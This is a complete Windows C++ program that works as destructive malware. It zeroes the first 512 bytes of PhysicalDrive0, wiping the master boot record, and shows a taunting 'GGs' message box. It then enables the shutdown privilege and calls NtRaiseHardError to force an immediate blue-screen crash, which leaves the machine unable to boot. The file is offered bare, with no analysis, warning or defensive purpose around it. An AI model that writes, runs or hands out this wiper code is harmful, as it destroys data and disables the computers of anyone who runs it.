#include <Windows.h>
#include <iostream>



#pragma comment(lib, "ntdll.lib")


typedef NTSTATUS(NTAPI* TFNNtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters,
	ULONG UnicodeStringParameterMask, PULONG_PTR* Parameters, ULONG ValidResponseOption, PULONG Response);

typedef NTSTATUS(NTAPI* TFNRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

int main()
{
	DWORD write;

	char mbrData[512];

	ZeroMemory(&mbrData, sizeof(mbrData));

	HANDLE MBR = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);

	WriteFile(MBR, mbrData, 512, &write, NULL);

	CloseHandle(MBR);

	MessageBoxA(NULL, "GGs", "caption", MB_OKCANCEL | MB_SYSTEMMODAL);
			
	HMODULE hNtdll = GetModuleHandle("ntdll.dll");

	if (hNtdll != 0)
	{
		NTSTATUS s1, s2;
		BOOLEAN b;
		ULONG r;

		

		TFNRtlAdjustPrivilege pfnRtlAdjustPrivilege = (TFNRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
		s1 = pfnRtlAdjustPrivilege(19, true, false, &b);


		TFNNtRaiseHardError pfnNtRaiseHardError = (TFNNtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");
		s2 = pfnNtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, &r);
	}

	
	return 0;
}